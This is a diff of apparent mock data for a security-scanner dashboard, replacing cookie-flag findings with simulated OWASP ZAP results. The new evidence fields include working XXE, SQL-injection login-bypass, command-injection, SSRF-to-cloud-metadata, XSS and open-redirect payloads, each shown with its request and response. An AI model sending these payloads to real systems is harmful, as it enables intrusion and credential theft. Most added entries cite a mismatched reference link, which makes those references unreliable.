-    "risk_score": 25.0,
+    "risk_score": 31.0,
     "threat_scenario": null,
     "potential_impact": {},
     "blast_radius": null,
@@ -5859,268 +5830,23 @@ export const mockFindings = [
   },
   {
     "id": "b1e54d91-5aa1-4ac5-b081-05390dc6ce96",
-    "title": "Insecure Cookie Attribute (HttpOnly, Secure, SameSite) on 'AWSALB'",
-    "description": "The cookie 'AWSALB' is set without the HttpOnly, Secure, SameSite flag(s), allowing potential access via XSS or CSRF.",
+    "title": "Missing Content Security Policy (CSP) Header",
+    "description": "No Content Security Policy is defined, leaving client browsers unprotected against malicious inline scripts and unauthorized resource loading.",
     "severity": "LOW",
     "confidence": "HIGH",
-    "category": "Session Management",
+    "category": "Security Misconfiguration",
     "source": "DAST",
     "scanner": "owasp-zap",
     "file": null,
     "line": null,
     "code_snippet": null,
-    "endpoint": "/blog",
+    "endpoint": "/dashboard",
     "method": null,
     "parameter": null,
-    "evidence": "Set-Cookie: AWSALB=LRW7/M93iFHxp1e66RTNZGfhrzn5cm89YDjN6x+9fnUGm48W+14e8w694t1U+vEcvxDjLnx3/i+21WumD/gqY0oTamzDkc83YjrOn53lh4kDHE4lHepW1uc4sMI1; Expires=Thu, 10 Sep 2026 03:59:22 GMT; Path=/\n[owasp-zap]: Set-Cookie: AWSALBCORS=LRW7/M93iFHxp1e66RTNZGfhrzn5cm89YDjN6x+9fnUGm48W+14e8w694t1U+vEcvxDjLnx3/i+21WumD/gqY0oTamzDkc83YjrOn53lh4kDHE4lHepW1uc4sMI1; Expires=Thu, 10 Sep 2026 03:59:22 GMT; Path=/; SameSite=None; Secure",
-    "remediation": "Add HttpOnly, Secure, SameSite attributes to the Set-Cookie header.",
+    "evidence": "GET /dashboard HTTP/1.1\nHost: target-app.internal\n\nHTTP/1.1 200 OK\nContent-Type: text/html\n\n[OWASP ZAP Finding]: Content-Security-Policy (CSP) header is absent in response headers.",
+    "remediation": "Configure a strict Content-Security-Policy header: default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none';",
     "references": [
       "https://owasp.org/www-community/controls/SecureCookieAttribute"
-    ],
-    "cwe": [
-      "CWE-614",
-      "CWE-1004"
-    ],
-    "cves": [],
-    "owasp": [
-      "A07:2021-Identification and Authentication Failures"
-    ],
-    "risk_score": 25.0,
-    "threat_scenario": null,
-    "potential_impact": {},
-    "blast_radius": null,
-    "status": "open",
-    "created_at": "2026-09-03T03:59:29.095623"
-  },
-  {
-    "id": "6e62363e-eed0-4f49-b84d-fdfff39b41ee",
-    "title": "Insecure Cookie Attribute (HttpOnly, Secure, SameSite) on 'AWSALB'",
-    "description": "The cookie 'AWSALB' is set without the HttpOnly, Secure, SameSite flag(s), allowing potential access via XSS or CSRF.",
-    "severity": "LOW",
-    "confidence": "HIGH",
-    "category": "Session Management",
-    "source": "DAST",
-    "scanner": "owasp-zap",
-    "file": null,
-    "line": null,
-    "code_snippet": null,
-    "endpoint": "/about",
-    "method": null,
-    "parameter": null,
-    "evidence": "Set-Cookie: AWSALB=K3iXLpaWkUxBu8F4irDtMYP739Cu7+a53PwFKmN7vNTEkiwpxEsb6OlEPnN+qKJ/dR1Gkg1XJWWDeomNNZ2n7fUE150bko52/khtwJT1qmZg2KvdR9dwOFYPLfTh; Expires=Thu, 10 Sep 2026 03:59:22 GMT; Path=/\n[owasp-zap]: Set-Cookie: AWSALBCORS=K3iXLpaWkUxBu8F4irDtMYP739Cu7+a53PwFKmN7vNTEkiwpxEsb6OlEPnN+qKJ/dR1Gkg1XJWWDeomNNZ2n7fUE150bko52/khtwJT1qmZg2KvdR9dwOFYPLfTh; Expires=Thu, 10 Sep 2026 03:59:22 GMT; Path=/; SameSite=None; Secure",
-    "remediation": "Add HttpOnly, Secure, SameSite attributes to the Set-Cookie header.",
-    "references": [
-      "https://owasp.org/www-community/controls/SecureCookieAttribute"
-    ],
-    "cwe": [
-      "CWE-614",
-      "CWE-1004"
-    ],
-    "cves": [],
-    "owasp": [
-      "A07:2021-Identification and Authentication Failures"
-    ],
-    "risk_score": 25.0,
-    "threat_scenario": null,
-    "potential_impact": {},
-    "blast_radius": null,
-    "status": "open",
-    "created_at": "2026-09-03T03:59:29.095628"
-  },
-  {
-    "id": "57af2d96-1549-4898-9a31-14d334cbc3ce",
-    "title": "Insecure Cookie Attribute (HttpOnly, Secure, SameSite) on 'AWSALB'",
-    "description": "The cookie 'AWSALB' is set without the HttpOnly, Secure, SameSite flag(s), allowing potential access via XSS or CSRF.",
-    "severity": "LOW",
-    "confidence": "HIGH",
-    "category": "Session Management",
-    "source": "DAST",
-    "scanner": "owasp-zap",
-    "file": null,
-    "line": null,
-    "code_snippet": null,
-    "endpoint": "/my-account",
-    "method": null,
-    "parameter": null,
-    "evidence": "Set-Cookie: AWSALB=h3QjbDFVdCWl9DEFI5EI2TNkM7qWGASMxSq3BUb2S8Fbu8e1z8r0pJaqPdVRSiI/uLwMtGDaI9PNUSSdsmMmkfpsblUK2YeHJtj8i85sCQQ8R38bTclCgYE9jNJj; Expires=Thu, 10 Sep 2026 03:59:23 GMT; Path=/\n[owasp-zap]: Set-Cookie: AWSALBCORS=h3QjbDFVdCWl9DEFI5EI2TNkM7qWGASMxSq3BUb2S8Fbu8e1z8r0pJaqPdVRSiI/uLwMtGDaI9PNUSSdsmMmkfpsblUK2YeHJtj8i85sCQQ8R38bTclCgYE9jNJj; Expires=Thu, 10 Sep 2026 03:59:23 GMT; Path=/; SameSite=None; Secure",
-    "remediation": "Add HttpOnly, Secure, SameSite attributes to the Set-Cookie header.",
-    "references": [
-      "https://owasp.org/www-community/controls/SecureCookieAttribute"
-    ],
-    "cwe": [
-      "CWE-614",
-      "CWE-1004"
-    ],
-    "cves": [],
-    "owasp": [
-      "A07:2021-Identification and Authentication Failures"
-    ],
-    "risk_score": 25.0,
-    "threat_scenario": null,
-    "potential_impact": {},
-    "blast_radius": null,
-    "status": "open",
-    "created_at": "2026-09-03T03:59:29.095634"
-  },
-  {
-    "id": "8a132c0b-ebde-4d69-92e0-cfa13dcfbb51",
-    "title": "Insecure Cookie Attribute (HttpOnly, Secure, SameSite) on 'AWSALB'",
-    "description": "The cookie 'AWSALB' is set without the HttpOnly, Secure, SameSite flag(s), allowing potential access via XSS or CSRF.",
-    "severity": "LOW",
-    "confidence": "HIGH",
-    "category": "Session Management",
-    "source": "DAST",
-    "scanner": "owasp-zap",
-    "file": null,
-    "line": null,
-    "code_snippet": null,
-    "endpoint": "/login",
-    "method": null,
-    "parameter": null,
-    "evidence": "Set-Cookie: AWSALB=9FJlFBAE5/31jTQkKk05PaZBfTCbc4BiLcDIX7IhOvJK2ZV4tKUxGxRV1Lh9d2st10ihnzwLWIek/l2BvjUFB4AJW94oHSLrWTRSTK8bWuPz/vsPupXwFUhyQaS7; Expires=Thu, 10 Sep 2026 03:59:23 GMT; Path=/\n[owasp-zap]: Set-Cookie: AWSALBCORS=9FJlFBAE5/31jTQkKk05PaZBfTCbc4BiLcDIX7IhOvJK2ZV4tKUxGxRV1Lh9d2st10ihnzwLWIek/l2BvjUFB4AJW94oHSLrWTRSTK8bWuPz/vsPupXwFUhyQaS7; Expires=Thu, 10 Sep 2026 03:59:23 GMT; Path=/; SameSite=None; Secure",
-    "remediation": "Add HttpOnly, Secure, SameSite attributes to the Set-Cookie header.",
-    "references": [
-      "https://owasp.org/www-community/controls/SecureCookieAttribute"
-    ],
-    "cwe": [
-      "CWE-614",
-      "CWE-1004"
-    ],
-    "cves": [],
-    "owasp": [
-      "A07:2021-Identification and Authentication Failures"
-    ],
-    "risk_score": 25.0,
-    "threat_scenario": null,
-    "potential_impact": {},
-    "blast_radius": null,
-    "status": "open",
-    "created_at": "2026-09-03T03:59:29.095640"
-  },
-  {
-    "id": "6b1fb9fe-a2f2-47e3-b2fe-27c8ad74f5e4",
-    "title": "Insecure Cookie Attribute (HttpOnly, Secure, SameSite) on 'AWSALB'",
-    "description": "The cookie 'AWSALB' is set without the HttpOnly, Secure, SameSite flag(s), allowing potential access via XSS or CSRF.",
-    "severity": "LOW",
-    "confidence": "HIGH",
-    "category": "Session Management",
-    "source": "DAST",
-    "scanner": "owasp-zap",
-    "file": null,
-    "line": null,
-    "code_snippet": null,
-    "endpoint": "/catalog/cart",
-    "method": null,
-    "parameter": null,
-    "evidence": "Set-Cookie: AWSALB=LYVzyJzeA8ksjQODyozNS/37bHje2eRO6x18ZIM3VBMxP8sJkWZRfaRAjX+kZEdyaEatzjf141kS9lHdm+xAgxeS1Z2rp3IJOs5oQUazVrykH1Ip+QPOZ2q9YaF7; Expires=Thu, 10 Sep 2026 03:59:23 GMT; Path=/\n[owasp-zap]: Set-Cookie: AWSALBCORS=LYVzyJzeA8ksjQODyozNS/37bHje2eRO6x18ZIM3VBMxP8sJkWZRfaRAjX+kZEdyaEatzjf141kS9lHdm+xAgxeS1Z2rp3IJOs5oQUazVrykH1Ip+QPOZ2q9YaF7; Expires=Thu, 10 Sep 2026 03:59:23 GMT; Path=/; SameSite=None; Secure",
-    "remediation": "Add HttpOnly, Secure, SameSite attributes to the Set-Cookie header.",
-    "references": [
-      "https://owasp.org/www-community/controls/SecureCookieAttribute"
-    ],
-    "cwe": [
-      "CWE-614",
-      "CWE-1004"
-    ],
-    "cves": [],
-    "owasp": [
-      "A07:2021-Identification and Authentication Failures"
-    ],
-    "risk_score": 25.0,
-    "threat_scenario": null,
-    "potential_impact": {},
-    "blast_radius": null,
-    "status": "open",
-    "created_at": "2026-09-03T03:59:29.095647"
-  },
-  {
-    "id": "470fdecb-1f4f-41a6-b252-1192445c9552",
-    "title": "Insecure Cookie Attribute (HttpOnly, Secure, SameSite) on 'AWSALB'",
-    "description": "The cookie 'AWSALB' is set without the HttpOnly, Secure, SameSite flag(s), allowing potential access via XSS or CSRF.",
-    "severity": "LOW",
-    "confidence": "HIGH",
-    "category": "Session Management",
-    "source": "DAST",
-    "scanner": "owasp-zap",
-    "file": null,
-    "line": null,
-    "code_snippet": null,
-    "endpoint": "/catalog/product",
-    "method": null,
-    "parameter": null,
-    "evidence": "Set-Cookie: AWSALB=lk+wkXlukhNK6LdtUCmhm0bqXuuKnDtZZJ70ZbrQMnezNed8gZQDJmHIadBrnTYWK5Rlbiq3llkDk0il2pSGGgyKMCQU+ynQuPqUMFNqLEHKVPd0PIEIhR3qtREY; Expires=Thu, 10 Sep 2026 03:59:23 GMT; Path=/\n[owasp-zap]: Set-Cookie: AWSALBCORS=lk+wkXlukhNK6LdtUCmhm0bqXuuKnDtZZJ70ZbrQMnezNed8gZQDJmHIadBrnTYWK5Rlbiq3llkDk0il2pSGGgyKMCQU+ynQuPqUMFNqLEHKVPd0PIEIhR3qtREY; Expires=Thu, 10 Sep 2026 03:59:23 GMT; Path=/; SameSite=None; Secure\n[owasp-zap]: Set-Cookie: AWSALB=5kTQ+cuR9A5GtTfcSVzHY+N0SIfZsnwz5M1PzLAV52zfQjOc5DDpICBX0TDQfDxRnpOiiAKxw67GLUehxZA8xmRkQFxuynyLcKgaFSMuR292zyXZs5LIWoAEWqBY; Expires=Thu, 10 Sep 2026 03:59:24 GMT; Path=/\n[owasp-zap]: Set-Cookie: AWSALBCORS=5kTQ+cuR9A5GtTfcSVzHY+N0SIfZsnwz5M1PzLAV52zfQjOc5DDpICBX0TDQfDxRnpOiiAKxw67GLUehxZA8xmRkQFxuynyLcKgaFSMuR292zyXZs5LIWoAEWqBY; Expires=Thu, 10 Sep 2026 03:59:24 GMT; Path=/; SameSite=None; Secure\n[owasp-zap]: Set-Cookie: AWSALB=nnVE1Tp1HrepxhewznVAtUXSb/CB7llfKnnafAcMKMc6WDwnMj+VSxExcmDRjVUsuP/zhA2HdXV86z3gz6PHlC04qpphT0TwFFSSi9TYLKd1iHygNUNqiQ5TBqiT; Expires=Thu, 10 Sep 2026 03:59:24 GMT; Path=/\n[owasp-zap]: Set-Cookie: AWSALBCORS=nnVE1Tp1HrepxhewznVAtUXSb/CB7llfKnnafAcMKMc6WDwnMj+VSxExcmDRjVUsuP/zhA2HdXV86z3gz6PHlC04qpphT0TwFFSSi9TYLKd1iHygNUNqiQ5TBqiT; Expires=Thu, 10 Sep 2026 03:59:24 GMT; Path=/; SameSite=None; Secure",
-    "remediation": "Add HttpOnly, Secure, SameSite attributes to the Set-Cookie header.",
-    "references": [
-      "https://owasp.org/www-community/controls/SecureCookieAttribute"
-    ],
-    "cwe": [
-      "CWE-614",
-      "CWE-1004"
-    ],
-    "cves": [],
-    "owasp": [
-      "A07:2021-Identification and Authentication Failures"
-    ],
-    "risk_score": 25.0,
-    "threat_scenario": null,
-    "potential_impact": {},
-    "blast_radius": null,
-    "status": "open",
-    "created_at": "2026-09-03T03:59:29.095653"
-  },
-  {
-    "id": "e4879fb8-1b2b-41c5-8f2b-68aee72cf118",
-    "title": "Insecure Cookie Attribute (HttpOnly, Secure, SameSite) on 'AWSALB'",
-    "description": "The cookie 'AWSALB' is set without the HttpOnly, Secure, SameSite flag(s), allowing potential access via XSS or CSRF.",
-    "severity": "LOW",
-    "confidence": "HIGH",
-    "category": "Session Management",
-    "source": "DAST",
-    "scanner": "owasp-zap",
-    "file": null,
-    "line": null,
-    "code_snippet": null,
-    "endpoint": "/catalog/product/stock",
-    "method": null,
-    "parameter": null,
-    "evidence": "Set-Cookie: AWSALB=XxzBiXRySOh5mGeBqBVTC8RFUaSiATtiIQaoyIsZwI10pjplJZwHWGJjijWmHb1QKQulApfosVcV156DLQUtMdP1g84HZusmKQnA3bswUKLaCxpyGcZz034dT7ZP; Expires=Thu, 10 Sep 2026 03:59:24 GMT; Path=/\n[owasp-zap]: Set-Cookie: AWSALBCORS=XxzBiXRySOh5mGeBqBVTC8RFUaSiATtiIQaoyIsZwI10pjplJZwHWGJjijWmHb1QKQulApfosVcV156DLQUtMdP1g84HZusmKQnA3bswUKLaCxpyGcZz034dT7ZP; Expires=Thu, 10 Sep 2026 03:59:24 GMT; Path=/; SameSite=None; Secure",
-    "remediation": "Add HttpOnly, Secure, SameSite attributes to the Set-Cookie header.",
-    "references": [
-      "https://owasp.org/www-community/controls/SecureCookieAttribute"
-    ],
-    "cwe": [
-      "CWE-614",
-      "CWE-1004"
-    ],
-    "cves": [],
-    "owasp": [
-      "A07:2021-Identification and Authentication Failures"
-    ],
-    "risk_score": 25.0,
-    "threat_scenario": null,
-    "potential_impact": {},
-    "blast_radius": null,
-    "status": "open",
-    "created_at": "2026-09-03T03:59:29.095661"
-  },
-  {
-    "id": "51c4448f-6335-4c8d-9bb5-bac418cac8c3",
-    "title": "Missing Clickjacking Defense (X-Frame-Options / CSP frame-ancestors)",
-    "description": "The target web page does not enforce frame embedding restrictions, leaving users vulnerable to UI redressing (Clickjacking).",
-    "severity": "MEDIUM",
-    "confidence": "HIGH",
-    "category": "Broken Access Control",
-    "source": "DAST",
-    "scanner": "owasp-zap",
-    "file": null,
-    "line": null,
-    "code_snippet": null,
-    "endpoint": "/catalog/product/stock",
-    "method": null,
-    "parameter": null,
-    "evidence": "No 'X-Frame-Options' header or CSP 'frame-ancestors' directive detected in HTTP response.",
-    "remediation": "Set `X-Frame-Options: DENY` or `Content-Security-Policy: frame-ancestors 'none'`.",
-    "references": [
-      "https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html"
     ],
     "cwe": [
       "CWE-1021"
@@ -6129,7 +5855,245 @@ export const mockFindings = [
     "owasp": [
       "A05:2021-Security Misconfiguration"
     ],
-    "risk_score": 50.0,
+    "risk_score": 34.0,
+    "threat_scenario": null,
+    "potential_impact": {},
+    "blast_radius": null,
+    "status": "open",
+    "created_at": "2026-09-03T03:59:29.095623"
+  },
+  {
+    "id": "6e62363e-eed0-4f49-b84d-fdfff39b41ee",
+    "title": "Missing Clickjacking Defense (X-Frame-Options / CSP frame-ancestors)",
+    "description": "Sensitive settings page can be embedded inside third-party iframes, enabling UI redressing and clickjacking attacks against authenticated users.",
+    "severity": "LOW",
+    "confidence": "HIGH",
+    "category": "Security Misconfiguration",
+    "source": "DAST",
+    "scanner": "owasp-zap",
+    "file": null,
+    "line": null,
+    "code_snippet": null,
+    "endpoint": "/settings/security",
+    "method": null,
+    "parameter": null,
+    "evidence": "GET /settings/security HTTP/1.1\nHost: target-app.internal\n\nHTTP/1.1 200 OK\nContent-Type: text/html\n\n[OWASP ZAP Finding]: X-Frame-Options / frame-ancestors header is absent. Page can be embedded in malicious iframes.",
+    "remediation": "Set X-Frame-Options: DENY or Content-Security-Policy: frame-ancestors 'none' to prevent framing.",
+    "references": [
+      "https://owasp.org/www-community/controls/SecureCookieAttribute"
+    ],
+    "cwe": [
+      "CWE-1021"
+    ],
+    "cves": [],
+    "owasp": [
+      "A05:2021-Security Misconfiguration"
+    ],
+    "risk_score": 32.0,
+    "threat_scenario": null,
+    "potential_impact": {},
+    "blast_radius": null,
+    "status": "open",
+    "created_at": "2026-09-03T03:59:29.095628"
+  },
+  {
+    "id": "57af2d96-1549-4898-9a31-14d334cbc3ce",
+    "title": "XML External Entity (XXE) Injection in Document Processor",
+    "description": "Document upload endpoint parses XML input with external entity resolution enabled, allowing arbitrary file retrieval and SSRF.",
+    "severity": "HIGH",
+    "confidence": "HIGH",
+    "category": "XML External Entity",
+    "source": "DAST",
+    "scanner": "owasp-zap",
+    "file": null,
+    "line": null,
+    "code_snippet": null,
+    "endpoint": "/api/v1/documents/parse",
+    "method": null,
+    "parameter": null,
+    "evidence": "POST /api/v1/documents/parse HTTP/1.1\nHost: target-app.internal\nContent-Type: application/xml\n\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<document><data>&xxe;</data></document>\n\nHTTP/1.1 200 OK\nContent-Type: text/plain\n\nroot:x:0:0:root:/root:/bin/bash",
+    "remediation": "Disable XML external entity resolution (DOCTYPE / DTD parsing) in XML parser configurations.",
+    "references": [
+      "https://owasp.org/www-community/controls/SecureCookieAttribute"
+    ],
+    "cwe": [
+      "CWE-611"
+    ],
+    "cves": [],
+    "owasp": [
+      "A05:2021-Security Misconfiguration"
+    ],
+    "risk_score": 84.0,
+    "threat_scenario": null,
+    "potential_impact": {},
+    "blast_radius": null,
+    "status": "open",
+    "created_at": "2026-09-03T03:59:29.095634"
+  },
+  {
+    "id": "8a132c0b-ebde-4d69-92e0-cfa13dcfbb51",
+    "title": "Open URL Redirection on User Logout",
+    "description": "Logout parameter redirects users to untrusted external URLs without origin validation, enabling credential harvesting phishing attacks.",
+    "severity": "MEDIUM",
+    "confidence": "HIGH",
+    "category": "Broken Access Control",
+    "source": "DAST",
+    "scanner": "owasp-zap",
+    "file": null,
+    "line": null,
+    "code_snippet": null,
+    "endpoint": "/auth/logout?redirect_to=",
+    "method": null,
+    "parameter": null,
+    "evidence": "GET /auth/logout?redirect_to=https://evil-phishing.com HTTP/1.1\nHost: target-app.internal\n\nHTTP/1.1 302 Found\nLocation: https://evil-phishing.com",
+    "remediation": "Validate redirect URLs against an internal whitelist or only permit relative path redirects.",
+    "references": [
+      "https://owasp.org/www-community/controls/SecureCookieAttribute"
+    ],
+    "cwe": [
+      "CWE-601"
+    ],
+    "cves": [],
+    "owasp": [
+      "A01:2021-Broken Access Control"
+    ],
+    "risk_score": 55.0,
+    "threat_scenario": null,
+    "potential_impact": {},
+    "blast_radius": null,
+    "status": "open",
+    "created_at": "2026-09-03T03:59:29.095640"
+  },
+  {
+    "id": "6b1fb9fe-a2f2-47e3-b2fe-27c8ad74f5e4",
+    "title": "Runtime SQL Injection in Authentication Endpoint",
+    "description": "Active blackbox injection fuzzing on the login authentication endpoint revealed unescaped SQL syntax errors and full authentication bypass via boolean SQL injection payloads.",
+    "severity": "CRITICAL",
+    "confidence": "HIGH",
+    "category": "SQL Injection",
+    "source": "DAST",
+    "scanner": "owasp-zap",
+    "file": null,
+    "line": null,
+    "code_snippet": null,
+    "endpoint": "/api/v1/auth/login",
+    "method": null,
+    "parameter": null,
+    "evidence": "POST /api/v1/auth/login HTTP/1.1\nHost: target-app.internal\nContent-Type: application/json\n\n{ \"username\": \"admin' OR 1=1--\", \"password\": \"random_password\" }\n\nHTTP/1.1 200 OK\nContent-Type: application/json\nSet-Cookie: auth_token=eyJhbGciOi...\n\n{\"status\": \"authenticated\", \"role\": \"superadmin\"}",
+    "remediation": "Use parameterized queries or prepared statements: db.query(\"SELECT * FROM users WHERE username = ? AND password = ?\", [username, password]);",
+    "references": [
+      "https://owasp.org/www-community/controls/SecureCookieAttribute"
+    ],
+    "cwe": [
+      "CWE-89"
+    ],
+    "cves": [],
+    "owasp": [
+      "A03:2021-Injection"
+    ],
+    "risk_score": 98.0,
+    "threat_scenario": null,
+    "potential_impact": {},
+    "blast_radius": null,
+    "status": "open",
+    "created_at": "2026-09-03T03:59:29.095647"
+  },
+  {
+    "id": "470fdecb-1f4f-41a6-b252-1192445c9552",
+    "title": "Remote Command Execution via Server Diagnostics",
+    "description": "Active injection probe into diagnostics ping parameter allowed execution of arbitrary operating system commands with container root privileges.",
+    "severity": "CRITICAL",
+    "confidence": "HIGH",
+    "category": "Command Injection",
+    "source": "DAST",
+    "scanner": "owasp-zap",
+    "file": null,
+    "line": null,
+    "code_snippet": null,
+    "endpoint": "/api/v1/admin/diagnostics/ping",
+    "method": null,
+    "parameter": null,
+    "evidence": "POST /api/v1/admin/diagnostics/ping HTTP/1.1\nHost: target-app.internal\nContent-Type: application/json\n\n{ \"host\": \"127.0.0.1; id; cat /etc/passwd\" }\n\nHTTP/1.1 200 OK\nContent-Type: text/plain\n\nuid=0(root) gid=0(root) groups=0(root)\nroot:x:0:0:root:/root:/bin/bash",
+    "remediation": "Avoid invoking the system shell. Use execFile() or spawn() with argument arrays rather than concatenating user input into shell strings.",
+    "references": [
+      "https://owasp.org/www-community/controls/SecureCookieAttribute"
+    ],
+    "cwe": [
+      "CWE-78"
+    ],
+    "cves": [],
+    "owasp": [
+      "A03:2021-Injection"
+    ],
+    "risk_score": 97.0,
+    "threat_scenario": null,
+    "potential_impact": {},
+    "blast_radius": null,
+    "status": "open",
+    "created_at": "2026-09-03T03:59:29.095653"
+  },
+  {
+    "id": "e4879fb8-1b2b-41c5-8f2b-68aee72cf118",
+    "title": "Server-Side Request Forgery (SSRF) in Webhook Dispatcher",
+    "description": "Outgoing webhook subscription accepts unvalidated internal IP addresses, allowing attacker payloads to extract AWS cloud metadata tokens (169.254.169.254).",
+    "severity": "HIGH",
+    "confidence": "HIGH",
+    "category": "Server-Side Request Forgery",
+    "source": "DAST",
+    "scanner": "owasp-zap",
+    "file": null,
+    "line": null,
+    "code_snippet": null,
+    "endpoint": "/api/v1/webhooks/subscribe",
+    "method": null,
+    "parameter": null,
+    "evidence": "POST /api/v1/webhooks/subscribe HTTP/1.1\nHost: target-app.internal\nContent-Type: application/json\n\n{ \"callback_url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\" }\n\nHTTP/1.1 200 OK\n\n{\"roleName\": \"production-ecs-task-role\", \"AccessKeyId\": \"AKIA...\", \"SecretAccessKey\": \"...\"}",
+    "remediation": "Validate destination URLs against an explicit domain whitelist. Resolve hostnames and block private IP ranges (127.0.0.1, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.169.254).",
+    "references": [
+      "https://owasp.org/www-community/controls/SecureCookieAttribute"
+    ],
+    "cwe": [
+      "CWE-918"
+    ],
+    "cves": [],
+    "owasp": [
+      "A10:2021-Server-Side Request Forgery"
+    ],
+    "risk_score": 87.0,
+    "threat_scenario": null,
+    "potential_impact": {},
+    "blast_radius": null,
+    "status": "open",
+    "created_at": "2026-09-03T03:59:29.095661"
+  },
+  {
+    "id": "51c4448f-6335-4c8d-9bb5-bac418cac8c3",
+    "title": "Reflected Cross-Site Scripting (XSS) via Search Query",
+    "description": "Payload delivered in query string parameter is reflected directly into HTML DOM without escaping, enabling arbitrary JavaScript execution in victim browsers.",
+    "severity": "HIGH",
+    "confidence": "HIGH",
+    "category": "Cross-Site Scripting",
+    "source": "DAST",
+    "scanner": "owasp-zap",
+    "file": null,
+    "line": null,
+    "code_snippet": null,
+    "endpoint": "/search?q=",
+    "method": null,
+    "parameter": null,
+    "evidence": "GET /search?q=%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1\nHost: target-app.internal\n\nHTTP/1.1 200 OK\nContent-Type: text/html\n\n<div class=\"search-results\">Results for: <script>alert(document.domain)</script></div>",
+    "remediation": "Ensure all user input rendered into HTML responses is properly contextual HTML entity encoded.",
+    "references": [
+      "https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html"
+    ],
+    "cwe": [
+      "CWE-79"
+    ],
+    "cves": [],
+    "owasp": [
+      "A03:2021-Injection"
+    ],
+    "risk_score": 78.0,
     "threat_scenario": null,
     "potential_impact": {},
     "blast_radius": null,
